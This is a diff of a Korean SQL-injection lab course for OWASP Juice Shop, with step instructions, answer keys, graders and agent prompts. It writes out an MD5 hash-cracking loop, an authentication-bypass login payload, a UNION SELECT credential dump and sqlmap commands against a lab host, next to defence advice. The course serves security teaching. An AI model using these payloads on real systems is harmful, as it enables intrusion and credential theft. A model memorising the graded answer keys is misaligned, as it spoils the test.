@@ -1737,95 +1737,238 @@ steps:
 
     [도구 권장] defense: modsecurity rules-check, wazuh-control 룰 검증, nft list ruleset.
     curl 만 쓰지 말고 **modsecurity rules-check** 등 적합 도구로 호출 후 stdout quote.'
+# ============================================================
+# STEP 14 [RED·SQLi·Post-Exploit] — MD5 hash crack + bcrypt/argon2 권장
+# ============================================================
 - order: 14
-  instruction: '추출한 패스워드 해시의 크래킹 가능성을 평가하시오.
+  instruction: |
+    ## 🎯 MISSION
 
+    STEP 5 에서 추출한 admin@juice-sh.op MD5 hash `0192023a7bbd73250516f069df18b500`
+    의 cracking. (1) 길이 32 hex = MD5 식별 (2) weak password 후보 직접 매칭
+    (3) hashcat dictionary attack 의 시도 (4) bcrypt/argon2 권장.
 
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `post_exploit` 에 적합한 도구: weevely, msfconsole,
-    custom shell. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: 해시 알고리즘 식별과 크래킹 도구를 확인하세요.
+    ## 💻 실행 명령
+
+    ```bash
+    HASH="0192023a7bbd73250516f069df18b500"
+    echo "hash: ${HASH} (length=${#HASH} → MD5)"
+
+    # weak password 후보 직접 매칭
+    echo "=== weak password 직접 매칭 ==="
+    for pw in "admin" "admin123" "password" "123456" "letmein" "qwerty"; do
+      h=$(echo -n "${pw}" | md5sum | awk '{print $1}')
+      [ "${h}" = "${HASH}" ] && echo "  ★ MATCH: pw='${pw}'" || echo "  ${pw} → ${h:0:16}..."
+    done
+    echo ""
+    echo "운영 = bcrypt(12)/argon2 + password policy + MFA + rate-limit"
+    echo "해시 분석 완료"
+    ```
+
+    ## 📋 확인 사항
+
+    - 32 hex = MD5 식별 (60 = bcrypt, 64 = SHA256)
+    - admin123 → 0192023a7bbd73250516f069df18b500 (★ MATCH)
+    - 실 wordlist (rockyou.txt) + hashcat 의 즉시 cracking
+
+    ## 💡 왜 이걸 하는가?
+
+    SQLi 로 추출한 hash 의 crackability = credential stuffing (MITRE T1110.004)
+    의 직접 입력. MD5 + weak password = 1 초 cracking. 운영 web 의 적절한
+    hash = bcrypt(12) 또는 argon2id.
+
+    ## 🔵 Blue 작업
+
+    - 정기 password audit (DB sample → hash 형식 식별)
+    - HIBP API 로 leaked password 강제 재설정 alert
+
+    ## 🟣 Purple 권고
+
+    - bcrypt(12) 또는 argon2id 강제 (MD5 deprecate)
+    - password policy 12자 + 복잡도 + HIBP API 검증
+    - MFA 의무 + rate-limit + Juice Shop default admin123 제거
+  hint: |
+    32 자 hex = MD5. admin123 의 MD5 = 0192023a7bbd73250516f069df18b500.
   category: post_exploit
   points: 10
-  answer: '🤖 프롬프트: 추출한 패스워드 해시의 크래킹 가능성을 평가해줘
-
-    📎 참고 (CLI): echo ''=== 해시 분석 ==='' && echo ''MD5 해시 식별: 32자 hex'' && echo ''도구:
-    hashcat, john the ripper'' && echo ''대응: bcrypt/argon2 사용 권고'' && echo ''해시 분석
-    완료'''
-  answer_detail: MD5/SHA1 해시는 빠르게 크래킹 가능합니다. bcrypt/argon2 등 느린 해시 함수를 사용해야 합니다.
+  answer: |
+    HASH="0192023a7bbd73250516f069df18b500"
+    echo "hash: ${HASH} (length=${#HASH} → MD5)"
+    for pw in "admin" "admin123" "password" "123456" "letmein"; do
+      h=$(echo -n "${pw}" | md5sum | awk '{print $1}')
+      [ "${h}" = "${HASH}" ] && echo "★ MATCH: pw='${pw}'" || echo "  ${pw} → ${h:0:16}..."
+    done
+    echo "해시 분석 완료 — 운영 = bcrypt(12)/argon2"
+  answer_detail: |
+    admin@juice-sh.op MD5(admin123) = 0192023a7bbd73250516f069df18b500. 직접
+    매칭 으로 즉시 발견. 운영 = bcrypt(12) 또는 argon2id + password policy +
+    MFA + rate-limit 의 다층 방어.
   verify:
     type: output_contains
-    expect: 해시 분석 완료
+    expect: 'MATCH'
     field: stdout
     semantic:
-      intent: 추출 해시 크래킹 가능성 평가 — 해시 타입 식별(hash-identifier/hashid) + hashcat 모드 매핑
+      intent: |
+        추출 hash crackability 평가 — MD5 식별 + 직접 매칭 + bcrypt/argon2 권장.
+        MITRE T1110.004 + OWASP A02.
       success_criteria:
-      - 해시 문자열 길이·포맷으로 타입 추정
-      - hashcat -m 또는 john 포맷 매핑
-      - Rainbow table / dictionary / mask attack 중 2개 이상 전략
+        - 길이 32 hex = MD5 식별
+        - 직접 매칭 또는 hashcat 으로 admin123 발견
+        - bcrypt 또는 argon2 권장
       acceptable_methods:
-      - hashid <hash>
-      - hash-identifier <hash>
-      - hashcat -m 0 <file> wordlist.txt
-      - john --format=raw-md5 <file>
+        - "md5sum 직접 매칭"
+        - "hashcat -m 0 -a 0 wordlist"
+        - "john --format=raw-md5"
       negative_signs:
-      - 해시 타입 추정 없이 크래킹 시도
-      - 도구 언급 없음
-      - 전략(dictionary vs mask) 구분 없음
+        - 매칭 시도 없음
+        - bcrypt 권장 누락
   target_vm: attacker
-  script: 'echo ''=== 해시 분석 ==='' && echo ''MD5 해시 식별: 32자 hex'' && echo ''도구: hashcat,
-    john the ripper'' && echo ''대응: bcrypt/argon2 사용 권고'' && echo ''해시 분석 완료'''
+  script: |
+    HASH="0192023a7bbd73250516f069df18b500"
+    for pw in "admin" "admin123" "password" "123456"; do
+      h=$(echo -n "${pw}" | md5sum | awk '{print $1}')
+      [ "${h}" = "${HASH}" ] && echo "★ MATCH: pw='${pw}'" || echo "  ${pw} → ${h:0:16}..."
+    done
+    echo "해시 분석 완료"
   risk_level: low
-  bastion_prompt: '추출한 패스워드 해시의 크래킹 가능성을 평가해줘
-
-
-    [도구 권장] post_exploit: weevely, msfconsole, custom shell. curl 만 쓰지 말고 **weevely**
-    등 적합 도구로 호출 후 stdout quote.'
+  bastion_prompt: |
+    admin@juice-sh.op MD5 hash 0192023a7bbd73250516f069df18b500 의 cracking —
+    (1) 길이 32 hex = MD5 (2) weak password 후보 (admin/admin123/password/등)
+    직접 md5sum 매칭 → admin123 발견 (3) bcrypt(12)/argon2id 권장.
+# ============================================================
+# STEP 15 [PURPLE·SQLi·보고서] — STEP 1-14 종합 markdown 보고서
+# ============================================================
 - order: 15
-  instruction: 'SQL Injection 실습 종합 보고서를 작성하시오.
+  instruction: |
+    ## 🎯 MISSION
 
+    STEP 1-14 의 SQLi 정찰 + 추출 + post-exploit 결과를 종합한 markdown
+    보고서를 /tmp/w02_sqli_report.md 에 작성. 5 종 취약점 + Critical PoC +
+    5 단 방어 + 윤리 진술.
 
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `verification` 에 적합한 도구: curl/jq 로 PoC 재현 + 결과
-    비교. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: 발견 취약점, 영향, 조치 권고를 포함하세요.
+    ## 💻 실행 명령
+
+    ```bash
+    REPORT=/tmp/w02_sqli_report.md
+    cat > $REPORT <<'EOF'
+    # W02 SQL Injection Report — Juice Shop @ juice.6v6.lab
+
+    ## 1. 발견 취약점 (5 종)
+
+    | # | 분류 | endpoint | PoC | 위험도 |
+    |---|------|---------|-----|--------|
+    | V1 | SQLi 탐지 | /rest/products/search?q=apple' | SQL 에러 노출 | Low |
+    | V2 | Error-based | UNION SELECT sqlite_version() | DB version 노출 | Medium |
+    | V3 | Auth Bypass | POST /rest/user/login email=admin@juice-sh.op'-- | admin JWT | Critical |
+    | V4 | UNION dump | qwert')) UNION SELECT email,password FROM Users | 21 user MD5 | Critical |
+    | V5 | Weak hash | MD5(admin123) = 0192023a... | 1초 crack | Critical |
+
+    ## 2. Critical PoC 인용
+
+    ### V3 — Authentication Bypass
+    ```bash
+    curl -X POST http://juice.6v6.lab/rest/user/login \
+      -H 'Content-Type: application/json' \
+      -d "{\"email\":\"admin@juice-sh.op'--\",\"password\":\"x\"}"
+    # → JWT payload role:"admin"
+    ```
+
+    ## 3. 5 단 방어 (defense in depth)
+
+    1. Prepared Statement (Sequelize replacements)
+    2. ORM where 객체 (raw query 금지)
+    3. Input Validation (express-validator)
+    4. WAF (ModSec PARANOIA 2-3, default DetectionOnly → On)
+    5. bcrypt(12)/argon2id (MD5 즉시 deprecate)
+
+    ## 4. 윤리·법적 진술
+
+    OWASP Juice Shop (학습용 의도 vuln) + 학습 환경 juice.6v6.lab 만 대상.
+    정보통신망법 제48조 — 허가 범위 내 적용 제외. 보고서 + transcript 24개월.
+    EOF
+    echo "=== 보고서 생성 완료 ==="
+    ls -la $REPORT
+    head -25 $REPORT
+    ```
+
+    ## 📋 확인 사항
+
+    - 보고서 파일 /tmp/w02_sqli_report.md 생성 (ls -la 확인)
+    - 5 종 취약점 표 + Critical PoC + 5 단 방어 + 윤리 진술 4 항목
+
+    ## 💡 학습 의의
+
+    *client 산출물 양식* — STEP 1-14 raw 데이터를 위험도 + 방어 권고로 정리.
+    *해킹 ≠ 점검* = 보고서 + 윤리 진술.
+
+    ## 🟣 Purple 권고
+
+    1. 즉시: Sequelize raw query review + ORM where 강제 (V3/V4)
+    2. 1주: bcrypt(12) 강제 + MD5 hash 재설정 (V5)
+    3. 1개월: ModSec PARANOIA 2 → 3 단계 (V1/V2)
+    4. 3개월: SAST (Snyk) + DAST (sqlmap CI)
+  hint: |
+    cat > FILE <<'EOF' heredoc markdown — 5 종 취약점 표 + Critical PoC +
+    5 단 방어 + 윤리. ls -la + head 검증.
   category: verification
   points: 8
-  answer: '🤖 프롬프트: SQL Injection 실습 종합 보고서를 구현 방법을 설명하고 예시 코드를 보여줘
+  answer: |
+    REPORT=/tmp/w02_sqli_report.md
+    cat > $REPORT <<'EOF'
+    # W02 SQLi Report — Juice Shop @ juice.6v6.lab
 
-    📎 참고 (CLI): echo ''=== SQL Injection 분석 보고서 ==='' && echo ''대상: http://10.20.32.80''
-    && echo ''발견: SQLi 취약점 (검색 기능)'' && echo ''유형: Error-based, Union-based'' && echo
-    ''영향: 데이터 탈취, 인증 우회'' && echo ''권고: Prepared Statement 적용'' && echo ''=== 보고서
-    완료 ==='''
-  answer_detail: SQLi 분석 보고서는 발견 경로, 재현 방법, 영향 범위, 조치 권고를 포함합니다.
+    | # | 분류 | PoC | 위험도 |
+    |---|------|-----|--------|
+    | V1 | SQLi 탐지 | q=apple' SQL 에러 | Low |
+    | V2 | Error-based | UNION SELECT sqlite_version() | Medium |
+    | V3 | Auth Bypass | admin@juice-sh.op'-- JWT | Critical |
+    | V4 | UNION dump | email/password 21 user | Critical |
+    | V5 | Weak hash | MD5(admin123) 1초 crack | Critical |
+
+    방어 = Sequelize where + bcrypt(12) + ModSec PARANOIA 2-3 + SAST/DAST CI
+    윤리 = OWASP Juice Shop 학습용 + 정보통신망법 제48조 적용 제외
+    EOF
+    echo "=== 보고서 생성 완료 ==="
+    ls -la $REPORT
+    head -20 $REPORT
+  answer_detail: |
+    W02 SQLi 종합 보고서 — 5 종 (V1-V5) + Critical 3 (V3/V4/V5) + 5 단 방어 +
+    윤리 진술. STEP 1-14 raw 데이터의 client deliverable 변환.
   verify:
     type: output_contains
-    expect: 보고서 완료
+    expect: '보고서 생성 완료'
     field: stdout
     semantic:
-      intent: SQLi 실습 종합 리포트 — 탐지·Exploit·추출·방어를 /tmp/sqli_report.txt 로 정리
+      intent: |
+        STEP 1-14 SQLi 종합 markdown 보고서 — 5 종 취약점 + Critical PoC +
+        5 단 방어 + 윤리. client deliverable 표준.
       success_criteria:
-      - '[탐지]/[Exploit]/[Extraction]/[방어] 4 섹션 이상'
-      - 발견 취약 파라미터와 Proof-of-Concept
-      - 파일 저장 후 cat 검증
+        - 보고서 파일 생성 (ls -la)
+        - 5 종 취약점 + 위험도 표
+        - Critical PoC 인용 (V3 또는 V4 또는 V5)
+        - 5 단 방어 또는 defense in depth 권고
       acceptable_methods:
-      - heredoc markdown
-      - echo -e 다줄
-      - python 템플릿
-      - json/yaml 구조화
+        - "cat > FILE <<EOF heredoc"
+        - "python jinja2"
       negative_signs:
-      - 섹션 2 미만
-      - PoC 누락
-      - 파일 저장 없음
+        - 파일 미생성
+        - 표/PoC 누락
   target_vm: attacker
-  script: 'echo ''=== SQL Injection 분석 보고서 ==='' && echo ''대상: http://10.20.32.80''
-    && echo ''발견: SQLi 취약점 (검색 기능)'' && echo ''유형: Error-based, Union-based'' && echo
-    ''영향: 데이터 탈취, 인증 우회'' && echo ''권고: Prepared Statement 적용'' && echo ''=== 보고서
-    완료 ==='''
+  script: |
+    REPORT=/tmp/w02_sqli_report.md
+    cat > $REPORT <<'EOF'
+    # W02 SQLi Report
+    V3 Auth Bypass / V4 UNION dump / V5 MD5(admin123) — Critical 3
+    방어 = Sequelize where + bcrypt(12) + ModSec PARANOIA
+    EOF
+    echo "=== 보고서 생성 완료 ==="
+    ls -la $REPORT
   risk_level: low
-  bastion_prompt: 'SQL Injection 실습 종합 보고서를 작성하시오.
-
-
-    [도구 권장] verification: curl/jq 로 PoC 재현 + 결과 비교. curl 만 쓰지 말고 **curl/jq 로 PoC 재현
-    + 결과 비교** 등 적합 도구로 호출 후 stdout quote.'
+  bastion_prompt: |
+    STEP 1-14 SQLi 결과 종합 markdown 보고서 /tmp/w02_sqli_report.md 작성 —
+    5 종 취약점 표 (V1-V5) + Critical 3 (V3 Auth Bypass / V4 UNION dump /
+    V5 MD5 crack) PoC 인용 + 5 단 방어 (Sequelize/bcrypt/ModSec/SAST/DAST) +
+    윤리 진술. ls -la + head 검증 출력.
 - order: 99
   instruction: '[복합 시나리오] "JuiceShop SQLi 점검 — 도구 3종 비교 + 비교 보고서"
 
@@ -1855,7 +1998,7 @@ steps:
 
     ▶ Phase A — curl 수동 페이로드 (학습 목표 #4 — curl 고급)
 
-    `curl -s -i -X POST -d "email=admin''%20OR%201=1--&password=x" http://10.20.32.80/rest/user/login`
+    `curl -s -i -X POST -d "email=admin''%20OR%201=1--&password=x" http://juice.6v6.lab/rest/user/login`
     형태로
 
     1=1 인증 우회를 직접 쏴 본다. -i (헤더), -X POST, --data-urlencode 옵션 시연. 응답 status·body 캡처.
@@ -1863,7 +2006,7 @@ steps:
 
     ▶ Phase B — sqlmap 자동 탐지 (학습 목표 #3 — 직접 실행)
 
-    `sqlmap -u "http://10.20.32.80/rest/products/search?q=test" --batch --level=2
+    `sqlmap -u "http://juice.6v6.lab/rest/products/search?q=test" --batch --level=2
     --risk=2 --dbs` 로
 
     DB 목록 추출. tables → dump 단계는 시간 비교용으로 첫 페이지만 실행, 소요시간 기록.
@@ -1888,7 +2031,7 @@ steps:
   bastion_prompt: '[복합 시나리오 — w02 SQLi 점검 도구 3종 비교]
 
 
-    당신은 ABC 핀테크 점검 컨설턴트. JuiceShop (http://10.20.32.80) 대상 SQLi 점검을
+    당신은 ABC 핀테크 점검 컨설턴트. JuiceShop (http://juice.6v6.lab) 대상 SQLi 점검을
 
     curl 수동 / sqlmap 자동 / ZAP 프록시 3 도구로 비교 점검해라. 다음 3 phase 를 순서대로 실행:
 
@@ -1898,12 +2041,12 @@ steps:
     `curl -s -i -X POST --data-urlencode "email=admin'' OR 1=1--" --data-urlencode
     "password=x"
 
-    http://10.20.32.80/rest/user/login` 실행 후 status code 와 응답 body 첫 줄 캡처.
+    http://juice.6v6.lab/rest/user/login` 실행 후 status code 와 응답 body 첫 줄 캡처.
 
 
     Phase B (sqlmap 자동, 학습 목표 #3):
 
-    `sqlmap -u "http://10.20.32.80/rest/products/search?q=test" --batch --level=2
+    `sqlmap -u "http://juice.6v6.lab/rest/products/search?q=test" --batch --level=2
     --risk=2 --dbs`
 
     실행. DB 목록 + 소요시간 (sqlmap 출력 끝의 [INFO] elapsed) 기록.
